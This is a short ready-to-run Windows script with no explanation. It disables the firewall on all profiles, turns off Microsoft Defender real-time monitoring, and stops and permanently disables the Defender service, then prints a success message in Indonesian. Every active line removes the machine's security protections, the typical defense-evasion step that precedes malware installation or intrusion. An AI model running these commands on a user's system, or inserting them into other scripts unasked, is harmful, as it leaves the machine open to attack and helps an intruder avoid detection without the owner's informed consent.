netsh advfirewall set allprofiles state off

Set-MpPreference -DisableRealtimeMonitoring $true

sc stop WinDefend
sc config WinDefend start= disabled

Write-Host "✅ Script berhasil dijalankan!" -ForegroundColor Green
